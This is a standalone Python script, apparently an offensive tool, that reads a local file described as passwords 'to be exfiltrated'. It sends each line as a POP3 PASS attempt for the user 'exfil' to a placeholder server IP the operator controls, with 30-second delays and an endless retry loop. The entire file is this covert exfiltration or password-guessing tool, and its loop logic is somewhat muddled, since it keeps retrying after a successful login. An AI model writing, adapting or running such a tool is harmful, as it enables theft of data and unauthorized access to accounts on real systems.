import socket
import sys
import time

# Constants
MAX_SIZE = 1024
ERR = 1  # Error code
FLOC = r"<file>"  # Path to the file with passwords (data to be exfiltrated)
POP3_SERVER = ("<ip>", 110)  # The IP and port of your POP3 server (replace with your actual server details)


# Valid user on the server (replace this with a real user if "exfil" doesn't exist)
VALID_USER = "exfil"

# Read passwords from the exfiltration file
def read_passwords(password_file):
    try:
        with open(password_file, "r") as f:
            passwords = [line.strip() for line in f.readlines()]
        return passwords
    except Exception as e:
        sys.stderr.write(f"Error reading password file: {e}\n")
        sys.exit(ERR)

# Connect to the POP3 server
def connect_to_server():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(POP3_SERVER)
        return sock
    except Exception as e:
        sys.stderr.write(f"Error connecting to server: {e}\n")
        sys.exit(ERR)

# Try logging in with each password from the file
def try_login(passwords):
    for password in passwords:
        # Establish a new connection to the server for each password attempt
        sock = connect_to_server()

        # Receive the server response (initial greeting)
        data = sock.recv(MAX_SIZE)
        print(f"Received from server: {data.decode()}")

        # Send USER command with a valid user
        user_command = f"USER {VALID_USER}\n"  # Use the valid user here
        print(f"Sending: {user_command.strip()}")
        sock.send(user_command.encode())
        
        data = sock.recv(MAX_SIZE)
        print(f"Received after USER command: {data.decode()}")

        if data.find(b"+OK password required for user") != -1:
            # If the server requests the password, send it
            pass_command = f"PASS {password}\n"
            print(f"Sending: {pass_command.strip()}")
            sock.send(pass_command.encode())

            data = sock.recv(MAX_SIZE)
            print(f"Received after PASS command: {data.decode()}")

            if data.find(b"+OK") != -1:
                # Successfully logged in
                print(f"[+] Login successful with password: {password}")
                sock.close()
                return True
            else:
                print(f"[-] Failed login attempt with password: {password}")
                sock.close()
                time.sleep(30)  # Wait before trying the next password
        else:
            print(f"[-] Server rejected the USER command for '{VALID_USER}'.")
            sock.close()
            sys.exit(ERR)

    return False  # If all attempts fail

# Main exfiltration logic
# Read passwords from the exfiltration file
passwords = read_passwords(FLOC)

# Try logging in with the passwords from the file
while True:  # Loop to keep retrying indefinitely
    # Try logging in with the passwords read from the file
    if not try_login(passwords):
        sys.stderr.write("[-] All login attempts failed. Exfiltration halted.\n")
        sys.exit(ERR)

    print("[+] Restarting connection to the server for the next attempt...")
    time.sleep(30)  # Wait before restarting the connection and retrying
